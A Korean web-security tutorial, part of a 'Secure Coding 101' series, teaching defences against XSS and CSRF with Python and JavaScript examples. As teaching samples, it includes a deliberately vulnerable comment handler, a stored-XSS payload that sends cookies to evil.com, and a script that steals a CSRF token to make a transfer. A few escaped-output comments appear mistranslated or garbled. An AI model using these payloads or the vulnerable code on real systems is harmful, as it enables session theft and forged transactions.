---
series: secure-coding-101
episode: 8
title: "Secure Coding 101 (8/10): XSS와 CSRF 방어"
status: content-ready
targets:
  tistory: true
  medium: false
  hashnode: false
  mkdocs: true
  ebook: true
language: ko
tags:
  - XSS
  - CSRF
  - CSP
  - SecureCoding
  - WebSecurity
seo_description: Output escaping, CSP, SameSite cookie, CSRF token 그리고 브라우저 공격 방어 5단계
last_reviewed: '2026-05-15'
---

# Secure Coding 101 (8/10): XSS와 CSRF 방어

브라우저는 사용자 편의 도구이지만, 동시에 공격자가 가장 자주 노리는 실행 환경이기도 합니다. 댓글 한 줄이 스크립트로 바뀌거나, 사용자가 모르는 사이에 다른 사이트에서 우리 서비스로 상태 변경 요청이 날아가면 기능은 그대로 있어도 신뢰는 무너집니다. XSS와 CSRF는 그 대표적인 두 갈래입니다.

이 글은 Secure Coding 101 시리즈의 8번째 글입니다.

여기서는 브라우저 공격을 입력 정제만으로 보는 대신, 출력 이스케이프와 CSP, 쿠키 정책, CSRF 검증이 함께 돌아가는 방어 체계로 정리하겠습니다. 이 관점을 이해하면 브라우저가 언제 우리 편이고 언제 공격자 도구가 되는지도 더 명확해집니다.


![Secure Coding 101 8장 흐름 개요](https://yeongseon-books.github.io/book-public-assets/assets/secure-coding-101/08/08-01-concept-at-a-glance.ko.png)
*Secure Coding 101 8장 흐름 개요*

## 먼저 던지는 질문

- XSS는 어떤 종류로 나뉘고 각각 어디서 생길까요?
- 출력 이스케이프와 CSP는 어떤 역할 분담을 할까요?
- CSRF는 왜 사용자의 권한을 그대로 악용할 수 있을까요?

## 왜 중요한가

XSS 한 번이면 세션 탈취, 화면 변조, 피싱 삽입, 관리자 권한 남용이 한 번에 이어질 수 있습니다. CSRF는 사용자가 로그인한 상태라는 사실을 악용해 송금, 삭제, 설정 변경 같은 상태 변경 요청을 몰래 수행하게 만듭니다. 두 취약점 모두 사용자의 브라우저를 우회 경로로 삼는다는 점에서 위험합니다.

이 주제가 특히 헷갈리는 이유는 입력이 아니라 출력과 요청 맥락이 핵심이기 때문입니다. 개발자는 종종 입력을 정제했으니 안전하다고 생각하지만, 실제로는 HTML 본문, 속성, 자바스크립트 문자열, URL 같은 출력 위치별 인코딩 규칙이 다릅니다. CSRF도 토큰 하나만의 문제가 아니라 쿠키 정책과 요청 출처 검증까지 함께 봐야 합니다.

## 한눈에 보는 구조

사용자 입력은 저장된 뒤 다시 출력될 수 있고, 그 출력이 브라우저에서 실행될 수도 있습니다. 동시에 브라우저는 다른 사이트에서 보낸 요청에도 쿠키를 자동 첨부할 수 있습니다. 그래서 출력 방어와 요청 출처 검증이 각각 필요합니다.

## 핵심 용어

- **반사형 XSS**: URL이나 요청 입력을 즉시 다시 출력하면서 생기는 XSS입니다.
- **저장형 XSS**: 데이터베이스에 저장된 입력이 나중에 렌더링될 때 발생하는 XSS입니다.
- **DOM 기반 XSS**: 클라이언트 자바스크립트가 `innerHTML` 같은 API로 입력을 삽입하면서 생기는 XSS입니다.
- **콘텐츠 보안 정책(CSP)**: 허용한 출처의 코드만 브라우저가 실행하도록 제한하는 정책입니다.
- **CSRF 토큰**: 상태 변경 요청이 우리 세션에서 나온 정상 요청인지 확인하는 예측 불가능한 토큰입니다.

## 바꾸기 전과 후

**바꾸기 전**: `<div>{{ comment }}</div>`를 그대로 렌더링하고, 상태 변경 요청은 쿠키만 있으면 처리합니다. 다른 사이트에서 보낸 요청도 브라우저가 쿠키를 붙여 전송할 수 있습니다.

**바꾼 후**: 출력 위치에 맞게 이스케이프하고, CSP를 적용하며, 쿠키에 `SameSite=Lax`를 설정하고, 상태 변경 요청에는 CSRF 토큰 검증을 붙입니다.

## 실습: 브라우저 공격을 막는 5단계

### 1단계 — 출력 위치에서 이스케이프합니다

```python
import html
def render_comment(text):
    return f"<div>{html.escape(text)}</div>"
```

중요한 점은 입력을 받는 순간이 아니라 출력하는 순간의 맥락입니다. HTML 본문, 속성, 자바스크립트, URL은 각기 다른 인코딩 규칙을 가집니다. 출력 위치에 맞게 이스케이프해야 안전합니다.

### 2단계 — 콘텐츠 보안 정책을 추가합니다

```python
response.headers["Content-Security-Policy"] = "default-src 'self'; script-src 'self'"
```

CSP는 이스케이프가 새는 상황에서 마지막 방어선 역할을 합니다. 기본적으로 어떤 출처의 스크립트를 허용할지 제한해 공격 성공 가능성을 낮춥니다. 다만 `unsafe-inline` 같은 예외를 많이 열어 두면 효과가 크게 약해집니다.

### 3단계 — 쿠키에 SameSite를 설정합니다

```python
response.set_cookie(
    "session", sid,
    httponly=True, secure=True, samesite="Lax",
)
```

SameSite는 교차 사이트 요청에 쿠키가 자동 전송되는 범위를 줄여 줍니다. 완전한 CSRF 방어는 아니지만, 기본 보호막으로 매우 중요합니다. `HttpOnly`와 `Secure`까지 함께 봐야 실제 세션 보호가 됩니다.

### 4단계 — CSRF 토큰을 발급하고 검증합니다

```python
import secrets
def issue_csrf():
    return secrets.token_urlsafe(32)

def verify_csrf(form_token, session_token):
    return secrets.compare_digest(form_token, session_token)
```

상태 변경 요청은 쿠키만으로 신뢰하면 안 됩니다. 브라우저가 자동으로 붙인 세션과, 우리 페이지가 발급한 예측 불가능한 토큰이 함께 맞아야 정상 요청으로 봐야 합니다. CSRF 방어의 핵심은 이중 확인입니다.

### 5단계 — 위험한 DOM 삽입 지점을 피합니다

```javascript
// element.innerHTML = userInput;  // 금지
element.textContent = userInput;    // 안전
```

## 실패 징후와 빠른 확인 포인트

브라우저 계층 문제는 사용자 제보가 대체로 모호합니다. “갑자기 이상한 팝업이 떠요”, “내가 누르지 않았는데 요청이 갔어요” 같은 증상을 빠르게 좁히려면 먼저 볼 항목을 정해 두는 편이 좋습니다.

```text
증상: 프런트엔드 배포 뒤 CSP report가 급증합니다
먼저 볼 항목:
1. 새 inline script 추가 여부
2. nonce 또는 hash 불일치
3. report-only 정책을 실제 차단 정책으로 올려야 하는지

증상: 특정 폼에서만 CSRF 실패가 늘어납니다
먼저 볼 항목:
1. 렌더링된 페이지에 토큰이 포함됐는지
2. cross-site redirect에서 SameSite 동작이 깨졌는지
3. 프록시 계층에서 Origin 또는 Referer가 바뀌는지
```

브라우저 공격 방어는 구현 자체도 중요하지만, 실패했을 때 원인을 빠르게 좁히는 운영 감각도 함께 필요합니다.

클라이언트 코드에서도 같은 원칙이 적용됩니다. 문자열을 HTML로 해석하게 만드는 API는 기본적으로 금지하고, 텍스트로만 넣는 API를 기본값으로 삼아야 합니다. DOM 기반 XSS는 서버 템플릿만 본다고 막히지 않습니다.

## 이 코드에서 먼저 볼 점

- 출력 이스케이프는 HTML, JS, 속성, URL처럼 맥락별로 달라집니다.
- CSP는 심층 방어이며, 이스케이프 누락을 보완하는 마지막 줄입니다.
- SameSite와 CSRF 토큰은 함께 써야 합니다.
- 브라우저 측 코드도 `innerHTML` 같은 위험한 지점을 직접 통제해야 합니다.

## 실무에서 자주 헷갈리는 지점

1. **Markdown을 raw HTML로 렌더링하는 경우**: `<script>`가 그대로 흘러 들어갈 수 있습니다.
2. **사용자 입력을 `innerHTML`에 넣는 경우**: 전형적인 DOM 기반 XSS입니다.
3. **CSP를 `unsafe-inline` 중심으로 구성하는 경우**: 정책을 켠 것처럼 보이지만 실제 보호는 약합니다.
4. **CSRF 토큰을 GET 요청에 실어 보내는 경우**: 캐시와 로그에 남을 수 있습니다.
5. **API가 `Origin`이나 `Referer`를 보지 않는 경우**: 교차 사이트 요청이 쉽게 통과할 수 있습니다.

## 실무에서는 이렇게 봅니다

대부분의 팀은 템플릿 엔진 자동 이스케이프를 기본으로 켜 두고, CSP는 먼저 report-only 모드로 배포한 뒤 위반 로그를 보며 점진적으로 강화합니다. 상태 변경 API는 CSRF 토큰 또는 `Origin` 검증을 반드시 거치고, 프런트엔드 코드 리뷰에서는 위험한 DOM API 사용 여부를 따로 확인합니다.

중요한 점은 입력 정제와 출력 이스케이프를 혼동하지 않는 것입니다. 입력 정제는 비즈니스 규칙을 위해 필요할 수 있지만, 브라우저 보안 관점에서는 출력 위치에 맞는 인코딩이 더 직접적인 방어입니다. 이 원칙을 놓치면 XSS 방어가 계속 어긋납니다.

## 선임 엔지니어는 이렇게 생각합니다

- 기본값은 항상 이스케이프이고 raw 출력은 예외입니다.
- CSP는 한 번에 끝내지 않고 점진적으로 강화합니다.
- SameSite와 CSRF 토큰을 함께 사용합니다.
- 사용자 입력을 DOM에 그대로 넣지 않고 `textContent`를 기본값으로 둡니다.
- 입력 정제보다 출력 이스케이프가 더 직접적인 방어인 경우가 많습니다.

## 체크리스트

- [ ] 템플릿 자동 이스케이프가 켜져 있습니다.
- [ ] CSP가 적용돼 있습니다.
- [ ] 쿠키에 SameSite 설정이 있습니다.
- [ ] 상태 변경 요청에 CSRF 검증이 있습니다.

## 연습 문제

1. 반사형 XSS와 저장형 XSS 예를 한 줄씩 적어 보세요.
2. CSP nonce가 어떻게 동작하는지 설명해 보세요.
3. `SameSite=Strict`가 깨뜨릴 수 있는 사용자 흐름을 하나 들어 보세요.

## 정리와 다음 글

브라우저 공격은 복잡한 마술보다 기본 원칙으로 막는 경우가 많습니다. 이 글에서는 출력 이스케이프, CSP, SameSite 쿠키, CSRF 토큰, 위험한 DOM API 회피가 어떻게 한 방어 체계를 이루는지 정리했습니다.

다음 글에서는 우리가 직접 작성하지 않은 코드에서 시작되는 공급망 위험, 의존성 취약점 관리를 다룹니다.

## 심화 실전 노트: Stored XSS 재현, CSP nonce 구현, Double-Submit Cookie, SPA CSRF 방어

### Stored XSS 공격 재현과 방어

Stored XSS는 공격 페이로드가 데이터베이스에 저장된 뒤, 다른 사용자가 해당 데이터를 볼 때 실행됩니다. 댓글, 프로필 이름, 게시글 본문이 대표적인 삽입 지점입니다.

```python
# 취약한 코드 — 저장된 댓글을 그대로 렌더링
from fastapi import FastAPI
from fastapi.responses import HTMLResponse

app = FastAPI()
comments_db = []

@app.post("/comments")
async def add_comment(body: dict):
    comments_db.append(body["text"])  # 저장 시점에는 문제 없음
    return {"status": "saved"}

@app.get("/comments", response_class=HTMLResponse)
async def list_comments():
    # 취약: 저장된 값을 그대로 HTML에 삽입
    items = "".join(f"<li>{c}</li>" for c in comments_db)
    return f"<ul>{items}</ul>"

# 공격자가 저장하는 댓글:
# <script>가져오기('https://evil.com/steal?c='+document.cookie)</script>
# → 다른 사용자가 댓글 목록을 볼 때 세션 쿠키 탈취
```

```python
# 수정: 출력 시점에 이스케이프
import html

@app.get("/comments", response_class=HTMLResponse)
async def list_comments_safe():
    items = "".join(f"<li>{html.escape(c)}</li>" for c in comments_db)
    return f"<ul>{items}</ul>"
    # <스크립트> → <스크립트> 로 변환하여 로마 표시
```

Stored XSS가 특히 위험한 이유는 공격자가 없어도 페이로드가 계속 실행된다는 점입니다. 한 번 저장되면 해당 페이지를 방문하는 모든 사용자가 피해자가 됩니다.

### 출력 맥락별 이스케이프 규칙

XSS 방어에서 가장 흔한 실수는 "HTML 이스케이프만 하면 된다"고 생각하는 것입니다. 출력 위치에 따라 필요한 인코딩이 다릅니다.

```python
import html
import json
import urllib.parse

user_input = '"><script>alert(1)</script>'

# 1. HTML 본문 — HTML 엔터티 이스케이프
safe_html = html.escape(user_input)
# → "><script>alert(1)</script>
template = f"<div>{safe_html}</div>"

# 2. HTML 속성 — 따옴표 포함 이스케이프 + 항상 따옴표로 감싸기
safe_attr = html.escape(user_input, quote=True)
template = f'<input value="{safe_attr}">'

# 3. JavaScript 문자열 — JSON 인코딩
safe_js = json.dumps(user_input)  # 따옴표, 역슬래시, 제어 문자 처리
template = f"<script>var data = {safe_js};</script>"

# 4. URL 파라미터 — percent 인코딩
safe_url = urllib.parse.quote(user_input, safe="")
template = f'<a href="/search?q={safe_url}">검색</a>'

# 5. CSS 값 — 허용 목록 기반 (이스케이프보다 제한이 안전)
ALLOWED_COLORS = {"red", "blue", "green", "black", "white"}
def safe_color(value: str) -> str:
    return value if value in ALLOWED_COLORS else "black"
```

```text
출력 위치별 인코딩 요약:
| 위치            | 인코딩 방식        | 위험한 문자           |
|----------------|--------------------|-----------------------|
| HTML 본문      | HTML entity        | < > & " '            |
| HTML 속성      | HTML entity + 따옴표 | " ' < > &           |
| JavaScript     | JSON encode        | ' " \ / 제어 문자    |
| URL 파라미터   | percent encode     | & = ? # 공백          |
| CSS 값         | 허용 목록          | expression() url()    |
```

### CSP nonce 기반 인라인 스크립트 허용

CSP에서 `'unsafe-inline'`을 제거하면 인라인 스크립트가 모두 차단됩니다. 하지만 레거시 코드나 서드파티 위젯 때문에 인라인이 필요한 경우, nonce를 사용하면 특정 스크립트만 허용할 수 있습니다.

```python
import secrets
from fastapi import FastAPI, Request
from fastapi.responses import HTMLResponse

app = FastAPI()

@app.middleware("http")
async def add_csp_nonce(request: Request, call_next):
    # 매 요청마다 새 nonce 생성
    nonce = secrets.token_urlsafe(16)
    request.state.csp_nonce = nonce
    response = await call_next(request)
    response.headers["Content-Security-Policy"] = (
        f"default-src 'self'; "
        f"script-src 'self' 'nonce-{nonce}'; "
        f"style-src 'self' 'nonce-{nonce}'; "
        f"img-src 'self' data:; "
        f"report-uri /csp-report"
    )
    return response

@app.get("/page", response_class=HTMLResponse)
async def page(request: Request):
    nonce = request.state.csp_nonce
    return f"""
    <html>
    <head>
        <script nonce="{nonce}">
            // 이 스크립트는 nonce가 일치하므로 실행됨
            console.log("allowed");
        </script>
    </head>
    <body>
        <script>
            // nonce 없음 → CSP에 의해 차단됨
            console.log("blocked");
        </script>
    </body>
    </html>
    """
```

```python
# CSP 위반 보고 수집 엔드포인트
@app.post("/csp-report")
async def csp_report(request: Request):
    report = await request.json()
    logger.warning("csp_violation", extra={
        "blocked_uri": report.get("csp-report", {}).get("blocked-uri"),
        "violated_directive": report.get("csp-report", {}).get("violated-directive"),
        "document_uri": report.get("csp-report", {}).get("document-uri"),
    })
    return {"status": "received"}
```

CSP nonce의 핵심은 매 요청마다 예측 불가능한 새 값을 생성하는 것입니다. nonce가 고정되면 공격자가 알아낼 수 있으므로 의미가 없습니다.

### Double-Submit Cookie CSRF 방어

토큰 기반 CSRF 방어의 변형으로, 서버에 세션 저장소 없이도 동작하는 Double-Submit Cookie 패턴이 있습니다.

```python
import secrets
import hashlib
import hmac
from fastapi import FastAPI, Request, Response, HTTPException

app = FastAPI()
CSRF_SECRET = "server-side-secret-key"  # 환경 변수에서 읽어야 함

def generate_csrf_token(session_id: str) -> str:
    """세션 ID를 기반으로 CSRF 토큰 생성"""
    random_value = secrets.token_urlsafe(16)
    signature = hmac.new(
        CSRF_SECRET.encode(),
        f"{session_id}:{random_value}".encode(),
        hashlib.sha256
    ).hexdigest()
    return f"{random_value}.{signature}"

def verify_csrf_token(session_id: str, token: str) -> bool:
    """토큰의 서명을 검증"""
    parts = token.split(".", 1)
    if len(parts) != 2:
        return False
    random_value, provided_sig = parts
    expected_sig = hmac.new(
        CSRF_SECRET.encode(),
        f"{session_id}:{random_value}".encode(),
        hashlib.sha256
    ).hexdigest()
    return hmac.compare_digest(provided_sig, expected_sig)

@app.get("/form")
async def render_form(request: Request, response: Response):
    session_id = request.cookies.get("session_id", "")
    csrf_token = generate_csrf_token(session_id)
    # 쿠키와 폼 hidden field에 동일한 토큰 설정
    response.set_cookie("csrf_token", csrf_token, samesite="strict", httponly=False)
    return {"csrf_token": csrf_token}  # 폼에 hidden input으로 포함

@app.post("/transfer")
async def transfer(request: Request):
    session_id = request.cookies.get("session_id", "")
    cookie_token = request.cookies.get("csrf_token", "")
    form = await request.form()
    form_token = form.get("csrf_token", "")

    # 1. 쿠키 토큰과 폼 토큰이 일치하는지 확인
    if not hmac.compare_digest(cookie_token, form_token):
        raise HTTPException(status_code=403, detail="CSRF token mismatch")

    # 2. 토큰 서명이 유효한지 확인
    if not verify_csrf_token(session_id, form_token):
        raise HTTPException(status_code=403, detail="Invalid CSRF token")

    return {"status": "success"}
```

Double-Submit의 원리: 공격자는 다른 도메인에서 우리 쿠키를 읽을 수 없으므로, 폼에 올바른 토큰을 넣을 수 없습니다. 서명을 추가하면 공격자가 임의의 값을 양쪽에 동일하게 설정하는 것도 방지합니다.

### SPA(Single Page Application) CSRF 방어

SPA 환경에서는 전통적인 hidden form field 방식이 맞지 않습니다. 대신 커스텀 헤더 방식을 사용합니다.

```python
# 서버: 커스텀 헤더 검증
from fastapi import FastAPI, Request, HTTPException

app = FastAPI()

@app.middleware("http")
async def csrf_check(request: Request, call_next):
    if request.method in ("POST", "PUT", "DELETE", "PATCH"):
        # SPA는 fetch/XHR로 요청 → 맞춤형 헤더 추가 가능
        # 단순 form submit이나 이미지 태그로는 커스텀 헤더 불가
        csrf_header = request.headers.get("X-CSRF-Token")
        csrf_cookie = request.cookies.get("csrf_token")

        if not csrf_header or not csrf_cookie:
            raise HTTPException(status_code=403, detail="Missing CSRF token")
        if not hmac.compare_digest(csrf_header, csrf_cookie):
            raise HTTPException(status_code=403, detail="CSRF validation failed")

        # 추가: Origin 헤더 검증
        origin = request.headers.get("Origin", "")
        allowed_origins = {"https://myapp.com", "https://www.myapp.com"}
        if origin and origin not in allowed_origins:
            raise HTTPException(status_code=403, detail="Invalid origin")

    return await call_next(request)
```

```javascript
// 클라이언트 (SPA): 모든 상태 변경 요청에 커스텀 헤더 추가
function getCookie(name) {
  const match = document.cookie.match(new RegExp('(^| )' + name + '=([^;]+)'));
  return match ? match[2] : null;
}

async function apiRequest(url, method, body) {
  const response = await fetch(url, {
    method: method,
    headers: {
      'Content-Type': 'application/json',
      'X-CSRF-Token': getCookie('csrf_token'),  // 쿠키에서 읽어 헤더로 전송
    },
    credentials: 'same-origin',  // 쿠키 포함
    body: JSON.stringify(body),
  });
  return response.json();
}
```

커스텀 헤더 방식이 동작하는 이유: 브라우저의 CORS 정책은 다른 도메인에서 커스텀 헤더를 포함한 요청을 보내기 전에 preflight(OPTIONS)를 요구합니다. 서버가 해당 origin을 허용하지 않으면 본 요청이 전송되지 않습니다.

### XSS와 CSRF의 결합 공격

XSS가 성공하면 CSRF 방어도 무력화됩니다. 공격자가 페이지 내에서 스크립트를 실행할 수 있으면 CSRF 토큰을 읽어 정상 요청을 만들 수 있기 때문입니다.

```javascript
// XSS로 CSRF 토큰을 읽고 상태 변경 수행
// 이것이 XSS가 CSRF보다 더 근본적인 위협인 이유
const token = document.querySelector('meta[name="csrf-token"]').content;
fetch('/api/transfer', {
  method: 'POST',
  headers: {'X-CSRF-Token': token, 'Content-Type': 'application/json'},
  credentials: 'same-origin',
  body: JSON.stringify({to: 'attacker', amount: 10000})
});
```

이 때문에 방어 우선순위는 **XSS 차단 > CSRF 방어**입니다. XSS를 먼저 막아야 CSRF 방어가 의미를 가집니다. CSP, 출력 이스케이프, HttpOnly 쿠키가 모두 이 맥락에서 중요합니다.

### CSP 점진적 강화 전략

CSP를 처음부터 strict하게 설정하면 기존 기능이 깨질 수 있습니다. 실무에서는 report-only 모드로 시작해 점진적으로 강화합니다.

```python
# 단계 1: Report-Only — 차단하지 않고 위반만 수집
"Content-Security-Policy-Report-Only: default-src 'self'; script-src 'self' 'unsafe-inline'; report-uri /csp-report"

# 단계 2: unsafe-inline 제거 준비 — nonce 도입, 인라인 스크립트 정리
# 위반 보고서를 분석해 인라인 스크립트를 외부 파일로 이동

# 단계 3: 실제 정책 적용
"Content-Security-Policy: default-src 'self'; script-src 'self' 'nonce-{random}'; style-src 'self' 'nonce-{random}'; img-src 'self' data:; connect-src 'self' https://api.myapp.com; report-uri /csp-report"

# 단계 4: strict-dynamic 도입 (신뢰하는 스크립트가 로드하는 스크립트도 허용)
"Content-Security-Policy: script-src 'strict-dynamic' 'nonce-{random}'; object-src 'none'; base-uri 'self'"
```

```text
CSP 강화 체크리스트:
- [ ] report-only 모드에서 위반 로그 수집 중
- [ ] unsafe-inline 제거 완료 (nonce 또는 hash로 대체)
- [ ] unsafe-eval 사용하지 않음
- [ ] object-src 'none' 설정 (Flash/Java plugin 차단)
- [ ] base-uri 제한 (base tag injection 방지)
- [ ] frame-ancestors 설정 (clickjacking 방지)
```

## 처음 질문으로 돌아가기

- **XSS는 어떤 종류로 나뉘고 각각 어디서 생길까요?**
  - 반사형은 URL/요청 입력이 즉시 응답에 포함될 때, 저장형은 DB에 저장된 값이 나중에 렌더링될 때, DOM 기반은 클라이언트 JavaScript가 `innerHTML` 같은 API로 입력을 삽입할 때 발생합니다. Stored XSS 절에서 본 것처럼 저장형은 공격자 없이도 계속 실행되므로 피해 범위가 가장 넓습니다.
- **출력 이스케이프와 CSP는 어떤 역할 분담을 할까요?**
  - 출력 이스케이프는 1차 방어선으로 입력이 코드로 해석되지 않게 막고, CSP는 이스케이프가 누락됐을 때 브라우저가 허용하지 않은 스크립트 실행을 차단하는 2차 방어선입니다. nonce 절에서 본 것처럼 매 요청마다 예측 불가능한 값을 생성해야 CSP가 실효성을 가집니다.
- **CSRF는 왜 사용자의 권한을 그대로 악용할 수 있을까요?**
  - 브라우저가 교차 사이트 요청에도 쿠키를 자동 첨부하기 때문입니다. 공격 사이트에서 우리 서비스로 요청을 보내면 세션 쿠키가 함께 전송되어, 서버 입장에서는 정상 사용자 요청과 구분이 안 됩니다. SameSite 쿠키와 CSRF 토큰(Double-Submit 또는 커스텀 헤더)으로 요청 출처를 검증해야 합니다.

<!-- toc:begin -->
## 시리즈 목차

- [Secure Coding 101 (1/10): Secure Coding이란 무엇인가?](./01-what-is-secure-coding.md)
- [Secure Coding 101 (2/10): 입력값 검증](./02-input-validation.md)
- [Secure Coding 101 (3/10): 인증과 세션](./03-authentication-and-session.md)
- [Secure Coding 101 (4/10): 인가와 권한](./04-authorization-and-permissions.md)
- [Secure Coding 101 (5/10): 안전한 데이터 저장](./05-safe-data-storage.md)
- [Secure Coding 101 (6/10): Secret과 키 관리](./06-secret-and-key-management.md)
- [Secure Coding 101 (7/10): SQL Injection과 ORM 안전 사용](./07-sql-injection-and-orm.md)
- **XSS와 CSRF 방어 (현재 글)**
- Dependency 취약점 관리 (예정)
- 안전한 로깅과 감사 (예정)

<!-- toc:end -->

## 참고 자료

- [OWASP XSS Prevention Cheat Sheet](https://cheatsheetseries.owasp.org/cheatsheets/Cross_Site_Scripting_Prevention_Cheat_Sheet.html)
- [OWASP CSRF Prevention Cheat Sheet](https://cheatsheetseries.owasp.org/cheatsheets/Cross-Site_Request_Forgery_Prevention_Cheat_Sheet.html)
- [MDN — Content Security Policy](https://developer.mozilla.org/en-US/docs/Web/HTTP/CSP)
- [MDN — SameSite cookies](https://developer.mozilla.org/en-US/docs/Web/HTTP/Cookies)

- [이 시리즈 예제 코드](https://github.com/yeongseon-books/book-examples/tree/main/secure-coding-101/ko)

Tags: XSS, CSRF, CSP, SecureCoding, WebSecurity
